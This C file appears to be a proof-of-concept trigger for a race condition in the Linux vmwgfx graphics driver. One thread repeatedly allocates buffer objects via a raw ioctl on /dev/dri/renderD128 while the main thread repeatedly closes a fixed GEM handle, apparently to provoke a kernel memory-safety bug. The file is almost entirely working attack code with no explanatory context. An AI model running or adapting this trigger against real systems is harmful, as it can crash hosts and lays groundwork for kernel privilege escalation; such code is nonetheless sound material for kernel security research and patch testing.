#define _GNU_SOURCE

#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <drm/drm.h>

int dri_fd =-1;
__u32 handle = -1;

struct drm_vmw_alloc_bo_req {
        __u32 size;
        __u32 pad64;
};

struct drm_vmw_bo_rep {
        __u64 map_handle;
        __u32 handle;
        __u32 cur_gmr_id;
        __u32 cur_gmr_offset;
        __u32 pad64;
};

union drm_vmw_alloc_bo_arg {
        struct drm_vmw_alloc_bo_req req;
        struct drm_vmw_bo_rep rep;
};

struct drm_vmw_unref_dmabuf_arg {
        __u32 handle;
        __u32 pad64;
};

void trigger(void)
{
	int ret;
	union drm_vmw_alloc_bo_arg arg={0};
	arg.req.size=0x100;

	while(1) {
		memset(&arg, 0, sizeof(arg));
		arg.req.size=0x100;

		ret=ioctl(dri_fd, 0xC0186441, &arg);
		if (ret != 0 ){
	 		printf("[*]  Failed\n");
	 		exit(-1);
		}
		printf("[*]  created, Handle %u\n", arg.rep.handle);
		usleep(100);	
	}
}


void gem_close(){
	struct drm_gem_close arg = {0};
	arg.handle = 10;
	while(1){
		// int ret = ioctl(dri_fd, DRM_IOCTL_GEM_CLOSE, &arg);
		int ret = ioctl(dri_fd, 0x40086442, &arg);
		// printf("[*] DRM_VMW_UNREF_DMABUF, Handle %u, ret %d\n", arg.handle, ret);
		// sleep(1);	
	}
}

int main(void)
{
	dri_fd= open("/dev/dri/renderD128", O_RDWR);
 
	if(dri_fd == -1)
		return;
	
	pthread_t tid1,tid2;
	if(pthread_create(&tid1,NULL,trigger,NULL)){
		perror("[*] thread_create tid1\n");
	}
	
	gem_close();
	return 0;
}
